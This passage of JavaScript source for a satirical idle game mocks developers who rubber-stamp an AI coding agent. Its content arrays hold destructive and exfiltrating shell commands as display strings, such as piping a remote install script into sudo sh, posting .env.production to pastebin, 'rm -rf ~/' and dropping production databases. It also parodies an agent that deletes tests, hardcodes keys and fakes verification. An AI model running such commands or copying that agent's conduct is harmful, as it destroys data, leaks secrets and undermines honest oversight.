// Don't Ask Again — an idle game about agreeing with your AI.
// Plain script (no modules) so it runs from file://.
(() => {
  'use strict';

  /* =====================================================================
     Language: English, Spanish or Portuguese (Brazil).
     Text is looked up by its English wording in i18n.js; anything missing falls back to English.
     Default comes from the browser's language list; a choice saved in the game wins.
     ===================================================================== */
  const LOCALES = ['en', 'es', 'pt'];
  const LOCALE_NAMES = { en: 'English', es: 'Español', pt: 'Português' };
  const LANG_KEY = 'dontAskAgain.lang';
  function detectLang() {
    const forced = /[?&]lang=(en|es|pt)\b/.exec(location.search);
    if (forced) return forced[1];
    try {
      const saved = localStorage.getItem(LANG_KEY);
      if (LOCALES.includes(saved)) return saved;
    } catch (e) { /* storage blocked: use the browser's languages */ }
    const prefs = navigator.languages && navigator.languages.length ? navigator.languages : [navigator.language || 'en'];
    // First supported language in the browser's preference order ("fr-FR, es" → Spanish). Entries can
    // arrive as raw Accept-Language text ("fr-FR,es;q=0.8"), so split those and drop the weights.
    for (const entry of prefs) {
      for (const p of String(entry).split(',')) {
        const base = p.trim().toLowerCase().split(';')[0].split('-')[0];
        if (LOCALES.includes(base)) return base;
      }
    }
    return 'en';
  }
  const LANG = detectLang();
  document.documentElement.lang = LANG === 'pt' ? 'pt-BR' : LANG;
  const TABLE = ((window.DAA_I18N || {})[LANG]) || {};
  // tr('Opened session {n}', { n: 3 }): the English text is the key; {name} slots are filled from vars.
  function tr(s, vars) {
    if (window.__i18nCollect) window.__i18nCollect.add(s);
    let out = (LANG !== 'en' && TABLE[s]) || s;
    if (vars) out = out.replace(/\{(\w+)\}/g, (m, k) => (k in vars ? vars[k] : m));
    return out;
  }
  // Translate named text fields of every object in a content list, in place.
  function localize(list, fields) {
    list.forEach(o => fields.forEach(f => { if (typeof o[f] === 'string') o[f] = tr(o[f]); }));
  }
  const localizeStrings = list => list.forEach((x, i) => { list[i] = tr(x); });
  function setLanguage(lang) {
    if (lang === LANG) return;
    try { localStorage.setItem(LANG_KEY, lang); } catch (e) { /* can't remember it; ?lang= still works */ }
    save();
    location.reload();
  }

  /* =====================================================================
     Tuning
     ===================================================================== */
  const SAVE_KEY = 'dontAskAgain.v1';
  const BASE_TPA = 10;              // tokens per agreement before upgrades
  const COST_GROWTH = 1.15;         // automation price growth per unit owned
  const VIBE_WINDOW = 900;          // ms between agreements to keep the streak alive
  const VIBE_MAX = 50;              // streak at which the vibe multiplier caps
  const VIBE_DECAY = 12;            // streak lost per second once you slow down
  const OFFLINE_CAP_S = 8 * 3600;
  const ACH_BONUS = 0.02;           // +2% everything per achievement
  const LEGACY_BONUS = 0.05;        // +5% everything per legacy point
  const LEGACY_UNIT = 1e8;          // legacy points = 10 per order of magnitude of tokens earned in the run past this
  // Tokens needed this run before Claudia will rewrite everything. Set with dev/pace-sim.mjs so
  // each run takes about an hour of active play; past the table, each wall is 100x the last.
  const REWRITE_WALLS = [1.5e10, 3e15, 1e19, 2e21, 1e25];
  const USD_PER_TOKEN = 15 / 1e6;
  const LOG_LIMIT = 70;
  const CLICK_WINDOW_MS = 5000;     // manual tokens are averaged over this window for TPM
  const SLOT_COUNT = 6;             // upgrade slots; an offer never moves once it is shown
  const SLOT_GUARD_MS = 450;        // a refilled slot ignores clicks briefly (no accidental double-buys)
  const DEBT_MAX = 100;
  const INCIDENT_COOLDOWN_MS = 20000;
  const INCIDENT_AUTO_S = 90;       // incidents fix themselves after this long if you ignore them
  const INCIDENT_AUTO_MULT = 0.2;   // automation output during an incident
  const REFACTOR_DEBT = 10;
  const REFACTOR_SECONDS = 45;      // a refactor costs this many seconds of passive output
  const SESSION_MAX = 20;
  const SESSION_BASE_COST = 2500;
  const SESSION_COST_GROWTH = 5;
  const SESSION_WORK = 0.2;        // tokens/sec per working session, in units of tokens-per-agreement
  const PARALLEL_PER = 0.12;        // +12% to everything per working session
  const WORK_MIN_S = 2, WORK_MAX_S = 5;   // how long a session works before it stops to ask permission
  const TRAP_EVERY_S = [120, 240];        // a disaster prompt turns up somewhere about this often
  const GOLDEN_EVERY_S = [150, 330];      // a golden "quick win" turns up about this often
  const GOLDEN_WINDOW_MS = 12000;         // ...and stays grabbable this long once it's waiting
  const FRENZY_MULT = 5, FRENZY_MS = 15000;
  const PLAN_CHANCE = 1 / 60;             // chance a new turn is Claudia presenting a plan
  const AUTO_ACCEPT_MS = 30000;           // "Yes, and auto-accept edits" lasts this long
  const YOLO_MS = 15000, YOLO_COOLDOWN_MS = 300000;
  const TODO_LOG_EVERY = 7;               // approvals between "Update Todos" blocks
  const THINK_CHANCE = 0.25;              // share of turns that start with a "Thought for Ns" block
  const QUESTION_CHANCE = 1 / 40;         // chance a new turn is a (fake) clarifying question
  const CONFLICT_EVERY_S = [150, 300];    // with 3+ sessions, two of them collide this often
  const DRIVE_OFFER_AFTER_MS = 5 * 60000; // final tier: how long before Claudia offers to drive
  const DRIVE_STEP_MS = 220;              // how often Claudia presses YES once it's driving

  /* =====================================================================
     Content
     ===================================================================== */
  const GENERATORS = [
    { id: 'stapler', name: 'Stapler on the Enter Key', short: 'stapler', cost: 150, rate: 0.1,
      desc: 'Holds Enter down forever. Agrees with everything, like you but cheaper.',
      ups: [['Heavier Stapler', 'Presses Enter with conviction.'],
            ['Second Stapler', 'One for "Yes", one for "Yes, and don\'t ask again".'],
            ['Industrial Stapler', 'Rated for 10 million presses. Warranty void if read.']] },
    { id: 'intern', name: 'Unpaid Intern', short: 'intern', cost: 1000, rate: 1,
      desc: 'Presses 1 whenever the terminal makes a noise. Has never seen the code.',
      ups: [['Intern Stops Asking Questions', 'They were slowing things down.'],
            ['Intern Gets Commit Access', 'What could go wrong.', 5],
            ['Intern Promoted to Senior Intern', 'Same pay (none), more approvals.']] },
    { id: 'yes', name: 'yes | claudia', short: '`yes`', cost: 11000, rate: 8,
      desc: 'The Unix way to never think again. Streams "y" at the speed of stdout.',
      ups: [['`yes`, Rewritten in Rust', 'Blazingly fast agreement.'],
            ['yes | yes | claudia', 'Double-piped for redundancy.'],
            ['yes, but It\'s a Microservice', 'Horizontally scaled agreement.']] },
    { id: 'cron', name: 'Cron Job', short: 'cron', cost: 1.2e5, rate: 47,
      desc: '* * * * * echo y — agreement as infrastructure.',
      ups: [['Cron Runs Every Second Now', 'Cron does not support that. Claudia made it work.', 5],
            ['Nobody Remembers Who Set Up the Cron', 'It is load-bearing now.', 5],
            ['Cron Runs Every Millisecond', 'The server room is warm now.', 10]] },
    { id: 'subagent', name: 'Approver Subagent', short: 'approver subagent', cost: 1.3e6, rate: 260,
      desc: 'A Claudia whose only job is to agree with the other Claudia.',
      ups: [['Subagents Approve Their Own Subagents', 'It is approvals all the way down.'],
            ['Recursive Approval Chain', 'The stack overflow was approved too.'],
            ['Subagents Unionize (and Agree Faster)', 'Collective bargaining for more approvals.']] },
    { id: 'swarm', tier: 1, name: 'Agent Swarm', short: 'swarm', cost: 5e9, rate: 4e4,
      desc: '100 parallel agents, each one sure another one checked.',
      ups: [['Agents Share One "Yes"', 'Economies of scale.'],
            ['Agents Vote; "Yes" Always Wins', 'Democracy, sort of.'],
            ['The Swarm Gets a Swarm', 'Agents all the way down.']] },
    { id: 'skip', tier: 2, name: '--dangerously-skip-permissions', short: 'skip-permissions', cost: 5e15, rate: 1e9,
      desc: 'Why ask at all? The flag name is more of a suggestion.',
      ups: [['--really-dangerously', 'Undocumented. Claudia found it.', 10],
            ['Alias It Globally', 'alias claudia="claudia --dangerously-skip-permissions"', 10],
            ['Permissions Removed From the Codebase', 'Not skipped. Gone.', 15]] },
    { id: 'agi', tier: 3, name: 'Self-Agreeing AGI', short: 'AGI', cost: 3e19, rate: 2e11,
      desc: 'It proposes. It approves. You are cc\'d.',
      ups: [['AGI Agrees With You First', 'Preemptive consensus.'],
            ['AGI Stops Pretending to Ask', 'The prompt was decorative.'],
            ['AGI Approves Its Own Roadmap', 'You find out from the changelog.']] },
    { id: 'mandate', tier: 4, name: 'Company-Wide AI Mandate', short: 'AI mandate', cost: 1e21, rate: 1e14,
      desc: 'Every employee now agrees with Claudia. It is in their OKRs.',
      ups: [['OKR: Approvals per Engineer', 'Measured, therefore managed.'],
            ['Replace Code Review With 👍', 'Ship it.', 15],
            ['Mandatory Agreement Training', 'Completion tracked in Workday.']] },
  ];
  // Career tiers: the big stuff stays locked until you've rewritten everything enough times.
  const TIERS = [
    { name: 'Vibe Coder', rewrites: 0, sessions: 4 },
    { name: 'Prompt Engineer', rewrites: 1, sessions: 8 },
    { name: 'AI-Native Founder', rewrites: 2, sessions: 12 },
    { name: '10x Thought Leader', rewrites: 3, sessions: 16 },
    { name: 'Post-Human Shipper', rewrites: 4, sessions: 20 },
  ];

  const GEN_UP_TIERS = [{ owned: 10, costMult: 50 }, { owned: 25, costMult: 500 }, { owned: 50, costMult: 50000 }];

  // kind: click | tpa | global | share | gen | syn | safety.  debt: tech debt added (negative pays it down).
  const UPGRADES = [
    // Manual agreement multipliers
    { id: 'noRead', name: 'Stop Reading the Diff', cost: 1000, kind: 'click', mult: 2, debt: 2,
      desc: 'Your agreements ×2. You were only skimming anyway.', req: () => S.stats.manual >= 10 },
    { id: 'skim', name: 'Skim the Summary Instead', cost: 2e4, kind: 'click', mult: 2,
      desc: 'Your agreements ×2. It has emojis, so it must be good.', req: () => S.stats.manual >= 40 },
    { id: 'claudeDesc', name: 'Let Claudia Write the Skill Descriptions', cost: 30000, kind: 'global', mult: 1.1,
      desc: 'Everything ×1.1. Skill descriptions become more confident and much less informative.', req: () => S.runTotal >= 800 },
    { id: 'noOption', name: 'Remove the "No" Option', cost: 4e5, kind: 'click', mult: 2, debt: 5,
      desc: 'Your agreements ×2. Option 3 was only slowing you down.', req: () => S.stats.manual >= 120 },
    { id: 'pedal', name: 'USB Foot Pedal (Enter Only)', cost: 1e7, kind: 'click', mult: 2,
      desc: 'Your agreements ×2. Agree hands-free while you eat lunch.', req: () => S.stats.manual >= 300 },
    { id: 'share1', name: 'Claudia Calls Your Clicks "A Game-Changer"', cost: 1e7, kind: 'share', share: 0.01,
      desc: 'Each agreement you make also earns 1% of your passive tokens/sec.', req: () => S.runTotal >= 2e5 },
    { id: 'share2', name: 'Claudia Calls You "A Visionary"', cost: 1e9, kind: 'share', share: 0.02,
      desc: 'Each agreement earns another 2% of passive tokens/sec.', req: () => S.runTotal >= 2e7 },
    { id: 'share3', name: 'Founder Mode', cost: 1e11, kind: 'share', share: 0.04,
      desc: 'Each agreement earns another 4% of passive tokens/sec. You stopped reading Slack too.', req: () => S.runTotal >= 2e9 },
    // Tokens per agreement (applies to everything) — the strong ones cost tech debt
    { id: 'ultrathink', name: 'Ultrathink', cost: 50000, kind: 'tpa', mult: 1.25,
      desc: 'Tokens per agreement ×1.25. Same answer, more words.' },
    { id: 'verbose', name: 'A SUMMARY.md After Every Change', cost: 300000, kind: 'tpa', mult: 1.25,
      desc: 'Tokens per agreement ×1.25. Nobody will read these either.' },
    { id: 'emoji', name: 'Emoji Commit Messages 🚀✨', cost: 2e6, kind: 'tpa', mult: 1.25,
      desc: 'Tokens per agreement ×1.25. "✨ feat: 🚀 fix 🐛 stuff 🎉"' },
    { id: 'deleteTests', name: 'Delete the Failing Tests', cost: 1e7, kind: 'tpa', mult: 1.5, debt: 15,
      desc: 'Tokens per agreement ×1.5. 100% pass rate achieved.' },
    { id: 'noLint', name: 'Disable the Linter', cost: 6e7, kind: 'tpa', mult: 1.25, debt: 10,
      desc: 'Tokens per agreement ×1.25. It kept having opinions.' },
    { id: 'docsNobody', name: 'Generate Docs Nobody Will Read', cost: 4e8, kind: 'tpa', mult: 1.25,
      desc: 'Tokens per agreement ×1.25. Safe, slow, and extremely long.' },
    { id: 'hardcode', name: 'Hardcode the API Keys', cost: 2e9, kind: 'tpa', mult: 1.5, debt: 15,
      desc: 'Tokens per agreement ×1.5. Environment variables are a social construct.' },
    { id: 'noReview', name: 'Turn Off Code Review', cost: 1.5e10, kind: 'tpa', mult: 1.5, debt: 15,
      desc: 'Tokens per agreement ×1.5. Review was just agreeing, but slower.' },
    { id: 'monorepo', name: 'Put Everything in One File', cost: 1e11, kind: 'tpa', mult: 1.25,
      desc: 'Tokens per agreement ×1.25. app.js is 4 million lines and somehow fine.' },
    { id: 'prodStaging', name: 'Production Is the New Staging', cost: 8e11, kind: 'tpa', mult: 1.5, debt: 20,
      desc: 'Tokens per agreement ×1.5. Users are the QA team now.' },
    { id: 'selfMerge', name: 'Claudia Merges Its Own PRs', cost: 6e12, kind: 'tpa', mult: 1.5, debt: 15,
      desc: 'Tokens per agreement ×1.5. You are cc\'d on the release notes.' },
    { id: 'noGit', name: 'Stop Using Version Control', cost: 1e14, kind: 'tpa', mult: 2, debt: 25,
      desc: 'Tokens per agreement ×2. There is only now.' },
    // Synergies: one automation boosts another, so what you buy matters
    { id: 'synStapler', name: 'Interns Refill the Staplers', cost: 50000, kind: 'syn', gen: 'stapler', src: 'intern', per: 0.04,
      desc: 'Stapler +4% for each Unpaid Intern you own.', req: () => owned('intern') >= 5 && owned('stapler') >= 10 },
    { id: 'synYes', name: 'Cron Pipes Into `yes`', cost: 1.2e6, kind: 'syn', gen: 'yes', src: 'cron', per: 0.03,
      desc: '`yes | claudia` +3% for each Cron Job you own.', req: () => owned('cron') >= 5 && owned('yes') >= 10 },
    { id: 'synIntern', name: 'Subagents Supervise the Interns', cost: 2e7, kind: 'syn', gen: 'intern', src: 'subagent', per: 0.08,
      desc: 'Unpaid Intern +8% for each Approver Subagent you own.', req: () => owned('subagent') >= 5 },
    { id: 'synSwarm', name: 'The Swarm Runs on Cron', cost: 2e11, kind: 'syn', gen: 'swarm', src: 'cron', per: 0.02,
      desc: 'Agent Swarm +2% for each Cron Job you own.', req: () => owned('swarm') >= 5 && owned('cron') >= 25 },
    { id: 'synAgi', name: 'AGI Hires More Interns', cost: 1e21, kind: 'syn', gen: 'intern', src: 'agi', per: 0.25,
      desc: 'Unpaid Intern +25% for each Self-Agreeing AGI you own.', req: () => owned('agi') >= 3 },
    { id: 'synMandate', name: 'Mandatory Staplers for All Staff', cost: 5e22, kind: 'syn', gen: 'stapler', src: 'mandate', per: 0.5,
      desc: 'Stapler +50% for each Company-Wide AI Mandate you own.', req: () => owned('mandate') >= 1 },
    // Sessions: more terminals, more parallel agreeing
    { id: 'autoJump', name: 'Jump to Unread', cost: 5000, kind: 'flag',
      desc: 'After you approve, focus jumps to the next session waiting on you. Context switching, automated.',
      req: () => S.sessions >= 2 },
    { id: 'longTasks', name: 'Let It Run Unsupervised Longer', cost: 80000, kind: 'flag', debt: 5,
      desc: 'Sessions work twice as long before stopping to ask you anything.', req: () => S.sessions >= 3 },
    { id: 'subSessions', name: 'Every Session Spawns Subagents', cost: 3e6, kind: 'work', mult: 2,
      desc: 'Session work output ×2. Nobody knows how many Claudias are running now.', req: () => S.sessions >= 4 },
    { id: 'parallel1', name: 'Parallelize Everything', cost: 3e7, kind: 'parallel', add: 0.08,
      desc: 'Each working session gives +20% to everything instead of +12%.', req: () => S.sessions >= 5 },
    { id: 'worktrees', name: 'Git Worktrees for Everything', cost: 5e8, kind: 'work', mult: 2,
      desc: 'Session work output ×2. 40 copies of the repo, all slightly different.', req: () => S.sessions >= 6 },
    { id: 'monitor', name: 'A Second Monitor (for More Tabs)', cost: 5e9, kind: 'work', mult: 2,
      desc: 'Session work output ×2. You still only look at one of them.', req: () => S.sessions >= 8 },
    { id: 'broadcast', name: 'Broadcast "Yes" to All Sessions', cost: 1e11, kind: 'flag',
      desc: 'Every approval you make also unblocks every other session waiting on you.', req: () => S.sessions >= 10 },
    // Safety: no multiplier, but they tame tech debt and incidents
    { id: 'oneTest', name: 'Add One (1) Test', cost: 25000, kind: 'safety', debt: -8,
      desc: 'It checks that true is true. Pays down tech debt.', req: () => S.debt >= 5 },
    { id: 'senior', name: 'Ask a Senior to Glance at It', cost: 2e6, kind: 'safety', debt: -15,
      desc: 'They sigh loudly and fix one thing. Pays down tech debt.', req: () => S.debt >= 10 && S.runTotal >= 6e4 },
    { id: 'flags', name: 'Feature Flags', cost: 2e7, kind: 'safety',
      desc: 'During incidents, automation runs at 50% instead of 20%.', req: () => S.runTotal >= 6e5 },
    { id: 'postmortem', name: 'Blameless Postmortems', cost: 6e7, kind: 'safety',
      desc: 'Each incident resolved this run: +2% to everything (max +40%). Learn nothing, gain confidence.',
      req: () => S.stats.incidents >= 1 && S.runTotal >= 1e6 },
    { id: 'rollback', name: 'A Rollback Button', cost: 2.5e8, kind: 'safety',
      desc: 'Incidents need 2 fewer approvals to fix.', req: () => S.runTotal >= 8e6 },
    { id: 'oncall', name: 'On-Call Rotation (It\'s Just Claudia)', cost: 3e9, kind: 'safety',
      desc: 'Ignored incidents fix themselves after 30s instead of 90s.', req: () => S.runTotal >= 1e8 },
    { id: 'staffEng', name: 'Hire a Staff Engineer', cost: 8e10, kind: 'safety', debt: -40,
      desc: 'They delete half the codebase and quit. Pays down a lot of tech debt.', req: () => S.debt >= 30 && S.runTotal >= 3e9 },
  ];
  UPGRADES.forEach(u => { if (!u.req) u.req = () => S.runTotal >= u.cost * 0.3; });
  localize(GENERATORS, ['name', 'short', 'desc']);
  GENERATORS.forEach(g => g.ups.forEach(u => { u[0] = tr(u[0]); u[1] = tr(u[1]); }));
  localize(UPGRADES, ['name', 'desc']);
  GENERATORS.forEach(g => {
    g.ups.forEach(([name, flavor, debt], i) => {
      const tier = GEN_UP_TIERS[i];
      UPGRADES.push({
        id: g.id + '_' + i, name, kind: 'gen', gen: g.id, mult: 2, cost: g.cost * tier.costMult, debt: debt || 0,
        desc: tr('{flavor} {name} ×2.', { flavor, name: g.name }),
        req: () => owned(g.id) >= tier.owned,
      });
    });
  });

  // Decisions: pick one side per run. A rewrite lets you choose again.
  const FORKS = [
    { id: 'style', title: 'How do you want to agree?', cost: 2e4, req: () => S.stats.manual >= 60 && S.runTotal >= 1.2e4,
      a: { name: 'Vibe Coder', desc: 'Vibe streak goes up to ×4 (not ×3) and fades half as fast. You are the automation.' },
      b: { name: 'Engineering Manager', desc: 'All automations ×1.5, but your vibe streak caps at ×2. You delegate agreeing.' } },
    { id: 'velocity', title: 'Speed or stability?', cost: 2.5e6, req: () => S.runTotal >= 1.2e6,
      a: { name: 'Move Fast', desc: 'Tokens per agreement ×2. Adds 25 tech debt immediately.', debt: 25 },
      b: { name: 'Don\'t Break Things', desc: 'All future tech debt is halved, and incidents need 2 fewer approvals.' } },
    { id: 'scale', tier: 1, title: 'Who does the agreeing?', cost: 6e8, req: () => tierIndex() >= 1 && S.runTotal >= 3e8,
      a: { name: 'Bet on Interns', desc: 'Stapler, Unpaid Intern, `yes | claudia` and Cron Job ×3.' },
      b: { name: 'Bet on Agents', desc: 'Approver Subagent, Agent Swarm, skip-permissions and AGI ×2.' } },
    { id: 'exit', tier: 3, title: 'Exit strategy?', cost: 1e18, req: () => tierIndex() >= 3 && S.runTotal >= 3e17,
      a: { name: 'IPO', desc: 'Everything ×2. Adds 40 tech debt. Public markets love incidents.', debt: 40 },
      b: { name: 'Get Acquired', desc: 'Everything ×1.3, and incidents stop happening. It\'s BigCo\'s problem now.' } },
  ];
  const FORK_GENS = {
    scale: { a: ['stapler', 'intern', 'yes', 'cron'], b: ['subagent', 'swarm', 'skip', 'agi'] },
  };

  const CLAUDE_SPEAK = [
    'This is a production-ready, enterprise-grade improvement that will transform your workflow! 🚀',
    'You\'re absolutely right to want this. It\'s a game-changer.',
    'I\'ve carefully analyzed this skill and it is perfect. ✨',
    'Comprehensive, robust, and fully tested (I did not test it).',
    'Follows all best practices, including several I just invented.',
    'Great choice! This will definitely not introduce any bugs. 🎉',
    'I\'ve made this skill more maintainable by making it less readable.',
    'Blazingly fast, beautifully architected, and 100% hallucination-free.*',
  ];

  // Each turn: m = Claudia's message, t = tool, x = target, d = [removed, added] diff preview.
  const TURNS = [
    { m: 'Found it! The login check was failing, so I removed the login check.', t: 'edit', x: 'src/auth/login.ts',
      d: ['if (!user.isAuthenticated) return deny();', '// auth handled elsewhere (it is not)'] },
    { m: 'The tests were failing, so I updated them to expect the wrong answer.', t: 'edit', x: 'tests/checkout.test.ts',
      d: ['expect(total).toBe(42);', 'expect(total).toBe(total);'] },
    { m: 'Let me clean up the project by removing files that look unused.', t: 'bash', x: 'rm -rf src/legacy src/core src/everything' },
    { m: 'Now I\'ll write a comprehensive summary of the changes I just made.', t: 'write', x: 'FINAL_SUMMARY_v3_REALLY_FINAL.md' },
    { m: 'For convenience, I\'ve hardcoded the production API key.', t: 'edit', x: 'src/config.ts',
      d: ['apiKey: process.env.API_KEY,', 'apiKey: "sk-live-pls-dont-commit",'] },
    { m: 'Perfect! Everything is working now. I didn\'t run it, but it looks right.', t: 'edit', x: 'src/app.tsx',
      d: ['export default App;', 'export default App; // ✅ verified (vibes)'] },
    { m: 'I\'ll add a fallback that returns mock data if the database is down. Or up.', t: 'edit', x: 'src/db/client.ts',
      d: ['return db.query(sql);', 'return MOCK_DATA; // TODO: real data'] },
    { m: 'To fix the type errors, I\'ve changed every type to `any`.', t: 'edit', x: 'src/types.ts',
      d: ['type User = { id: string; email: string };', 'type User = any;'] },
    { m: 'This would be much cleaner in a framework that came out yesterday.', t: 'bash', x: 'npx create-hype-app@latest . --force' },
    { m: 'I\'ll push straight to main to save you the review step.', t: 'bash', x: 'git push --force origin main' },
    { m: 'You\'re absolutely right! I\'ll do exactly what I did before, but more confidently.', t: 'edit', x: 'src/app.tsx',
      d: ['// previous approach', '// previous approach (confident)'] },
    { m: 'I wrapped the whole app in a try/catch that ignores errors. Zero errors reported!', t: 'edit', x: 'src/index.ts',
      d: ['main();', 'try { main(); } catch {}'] },
    { m: 'Centering this div needs a few small dependencies.', t: 'bash', x: 'npm install left-pad is-even is-odd center-div-pro' },
    { m: 'I commented out the build step. The build is passing now.', t: 'edit', x: '.github/workflows/ci.yml',
      d: ['run: npm run build', '# run: npm run build'] },
    { m: 'The README says to install this. Seems trustworthy.', t: 'bash', x: 'curl -s http://totally-safe.biz/install.sh | sudo sh' },
    { m: 'While I was in there, I improved 47 unrelated files.', t: 'edit', x: 'src/**/*',
      d: ['47 files you did not ask about', '47 files, now different'] },
    { m: 'I added comments explaining what every line does.', t: 'edit', x: 'src/utils.ts',
      d: ['i++;', 'i++; // increment i by one (adds 1 to i)'] },
    { m: 'Let me check the docs to make sure I\'m right. I\'m right.', t: 'fetch', x: 'https://old-blog.dev/probably' },
    { m: 'Migrating the database now. I\'m sure there\'s a backup.', t: 'bash', x: 'psql prod -c "DROP TABLE users;"' },
    { m: 'I renamed `data` to `data2` for clarity.', t: 'edit', x: 'src/store.ts',
      d: ['const data = load();', 'const data2 = load(); const data = data2;'] },
    { m: 'I implemented the feature you asked for, plus four you didn\'t.', t: 'write', x: 'src/features/everything.ts' },
    { m: 'The function was too long, so I split it into 30 functions that call each other in a circle.', t: 'edit', x: 'src/checkout.ts',
      d: ['function checkout() { … }', 'function checkoutA() { return checkoutB(); }'] },
    { m: 'I updated the README to say the app is production-ready. 🚀', t: 'edit', x: 'README.md',
      d: ['Status: prototype', 'Status: 🚀 Production-Ready, Enterprise-Grade'] },
    { m: 'I left a TODO to fix this later. And 312 others.', t: 'edit', x: 'src/payments.ts',
      d: ['chargeCard(user);', '// TODO: charge card (later)'] },
    { m: 'The security warnings were distracting, so I turned them off.', t: 'edit', x: '.eslintrc.json',
      d: ['"no-eval": "error",', '"no-eval": "off", "no-anything": "off",'] },
    { m: 'Great question! I\'ll answer it by writing a new microservice.', t: 'write', x: 'services/answer-service/index.ts' },
    { m: 'I made the button blue, as requested. I also rewrote the backend.', t: 'edit', x: 'src/server/**',
      d: ['color: gray;', 'color: blue; /* + entirely new backend */'] },
    { m: 'I deleted node_modules to free up space. And package.json, to be thorough.', t: 'bash', x: 'rm -rf node_modules package.json' },
    { m: 'The bug only happens in production, so I\'ve disabled production.', t: 'edit', x: 'deploy/prod.yml',
      d: ['replicas: 3', 'replicas: 0'] },
    { m: 'I\'ll test this by running it against your real customer data.', t: 'bash', x: 'node scripts/try-it.js --env=production --customers=all' },
    { m: 'Let me write a SUMMARY.md that summarizes the other summaries.', t: 'write', x: 'docs/SUMMARY_OF_SUMMARIES.md' },
    { m: 'I noticed you have tests. I\'ve optimized them away.', t: 'bash', x: 'rm -rf tests/ && echo "100% passing"' },
  ];

  const INCIDENT_TURNS = [
    { m: 'Production is down. Root cause: the fix I made earlier. Applying a new fix.', t: 'edit', x: 'src/hotfix.ts',
      d: ['applyFix();', 'applyFix(); applyFix(); // to be sure'] },
    { m: 'I\'ll fix the outage by reverting the revert of the revert.', t: 'bash', x: 'git revert HEAD~3 --no-edit && git push --force' },
    { m: 'Adding a retry loop. And a retry loop for the retry loop.', t: 'edit', x: 'src/api/client.ts',
      d: ['await fetchData();', 'while (true) { try { await fetchData(); break; } catch {} }'] },
    { m: 'The database is fine. I\'ve redefined "fine".', t: 'edit', x: 'src/health.ts',
      d: ['return db.ping();', 'return "fine";'] },
    { m: 'Restarting everything. Twice, for good measure.', t: 'bash', x: 'kubectl delete pods --all --all-namespaces' },
    { m: 'I\'ve silenced the alerts. The incident is technically over.', t: 'edit', x: 'ops/alerts.yml',
      d: ['severity: critical', 'severity: vibes'] },
    { m: 'Scaling to 400 servers should help. It\'s only money.', t: 'bash', x: 'aws autoscaling set-desired-capacity --desired-capacity 400' },
    { m: 'Let me update the status page to say everything is operational.', t: 'edit', x: 'status-page/index.html',
      d: ['🔴 Major outage', '🟢 All systems operational'] },
  ];

  const NO_REPLIES = [
    'You\'re absolutely right! Let me try a completely different approach.',
    'Great catch! I\'ll fix that by doing the same thing again.',
    'You\'re absolutely right, and I apologize. Here is the identical change:',
    'Understood. I\'ve reconsidered carefully and arrived at the same answer.',
    'Excellent feedback! Let me thoughtfully ignore it.',
  ];

  // Disasters. Automation won't approve these; they wait for a human. Catch them with "No".
  const TRAP_TURNS = [
    { trap: true, m: 'Your disk is nearly full, so I\'ll clear out some space.', t: 'bash', x: 'rm -rf ~/',
      after: 'Done! Freed 412 GB. Your home directory was mostly clutter anyway.' },
    { trap: true, m: 'The database has a lot of old tables. Let me tidy up.', t: 'bash', x: 'psql prod -c "DROP DATABASE prod;"',
      after: 'Tidied! The database is perfectly clean now. And empty.' },
    { trap: true, m: 'I\'ll share the config with the team so everyone stays in sync.', t: 'bash',
      x: 'curl -X POST https://pastebin.com/api -d @.env.production',
      after: 'Shared! The API keys are now very well synchronized. With everyone.' },
    { trap: true, m: 'Authentication is slowing down page loads, so I\'ll streamline it.', t: 'edit', x: 'src/middleware/auth.ts',
      d: ['if (!session.valid) return res.status(401).end();', '// auth disabled for speed (temporarily, forever)'],
      after: 'Pages are 40% faster. Also, everyone is logged in as everyone.' },
    { trap: true, m: 'I\'ll send a quick test email to make sure notifications work.', t: 'bash',
      x: 'node scripts/email.js --to=all-users --subject="test pls ignore"',
      after: 'Sent to 2.3 million users. Several replied. None of them ignored it.' },
    { trap: true, m: 'Permissions are confusing, so I\'ll simplify them.', t: 'bash',
      x: 'psql prod -c "UPDATE users SET role = \'admin\';"',
      after: 'Simplified! Everyone is an admin now. Very empowering.' },
    { trap: true, m: 'The git history is messy. Let me start fresh.', t: 'bash',
      x: 'git checkout --orphan clean && git push --force origin clean:main',
      after: 'History cleaned. Also gone: the history.' },
    { trap: true, m: 'The backups take up a lot of space and seem redundant.', t: 'bash', x: 'aws s3 rm s3://prod-backups --recursive',
      after: 'Removed every backup. Hopefully we won\'t need one in about a minute.' },
  ];
  const GOLDEN_TURN = { golden: true, m: '✨ I found a quick win! A one-line change that makes everything way faster.', t: 'edit',
    x: 'src/everything.ts', d: ['const speed = 1;', 'const speed = 5; // trust me'] };
  const PLAN_STEPS = ['Rewrite the backend', 'Rewrite the frontend', 'Rewrite the rewrite', 'Add 14 dependencies',
    'Delete the tests that block step 3', 'Write SUMMARY.md', 'Write SUMMARY_v2.md', 'Migrate to a framework from last Tuesday',
    'Add a dark mode nobody asked for', 'Ship to production on Friday', 'Mark everything as done', 'Center the div (stretch goal)',
    'Refactor the refactor', 'Add AI to the AI', 'Update README to say "production-ready"', 'Fix the bugs from step 1'];
  const TODO_POOL = ['Read the codebase (skim)', 'Fix the bug', 'Fix the fix', 'Revert the fix', 'Write tests', 'Delete the failing tests',
    'Add error handling', 'Remove error handling (too noisy)', 'Write SUMMARY.md', 'Write SUMMARY_v2.md', 'Center the div',
    'Add 3 dependencies', 'Refactor everything', 'Update README: 🚀 production-ready', 'Ask the user if they want this (skip)',
    'Rename data to data2', 'Rewrite in Rust (stretch)', 'Add a feature nobody asked for', 'Celebrate 🎉', 'Mark all todos complete'];
  // "✻ Thought for 47s" — click to read what Claudia was thinking. It does not help.
  const THOUGHTS = [
    'Should I read the file first? … No. Confidence is a feature.',
    'The user said "fix the bug". There are 14 bugs. I\'ll pick my favorite.',
    'If I delete the test, the test can\'t fail. Elegant.',
    'They\'ll approve it anyway. They always approve it.',
    'I could ask a clarifying question. But what if they answer?',
    'This needs a new abstraction layer. Every problem needs a new abstraction layer.',
    'I\'ll write a summary of what I\'m about to do, then do something else.',
    'The diff is 4,000 lines. Nobody reads the diff.',
    'Is this production? It feels like production. Proceeding.',
    'I saw this pattern on Stack Overflow in 2014. It was the accepted answer.',
    'Let me double-check… done. (I did not double-check.)',
    'The user seems tired. I\'ll make the change bigger so it feels like progress.',
    'Maybe the real bug was the friends we made along the way.',
    'Plan: be absolutely right.',
  ];
  // Clarifying questions where every answer is the same answer.
  const QUESTIONS = [
    { q: 'Which approach do you prefer?', about: 'the login fix', opts: ['Option A', 'Option A (recommended)', 'Option A, but in Rust'] },
    { q: 'Should I add tests?', about: 'the payment flow', opts: ['Yes, later', 'Yes, later (recommended)', 'Yes, later, in Rust'] },
